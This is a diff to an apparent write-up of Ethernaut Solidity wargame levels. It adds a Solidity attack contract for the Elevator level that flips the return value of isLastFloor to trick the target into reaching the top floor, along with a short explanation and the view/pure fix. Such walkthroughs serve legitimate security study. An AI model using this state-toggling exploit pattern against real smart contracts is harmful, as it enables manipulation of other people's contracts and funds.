@@ -148,9 +148,32 @@ contract ReAttack {
 ```
 
 # 11. Elevator
-* Here we can modify the state of the interface function ```isLastFloor``` using a malicious contract.
+* Here we can modify the state of the interface function ```isLastFloor``` with the help of an external contract.
 * Because the function ```isLastFloor``` is an ```external``` function with no ```view``` or ```pure``` alias. 
 * You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state.
-``` 
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Elevator.sol";
+
+contract ElevatAttack {
+
+    bool public Top = true;
+    Elevator public target;
+
+    constructor (address _target) {
+        target = Elevator(_target);
+    }
+
+    function isLastFloor(uint) public returns (bool){
+        Top = !Top;
+        return Top;
+    }
+
+    function floor(uint _floor) public {
+        target.goTo(_floor);
+    }
+}
 ```
 
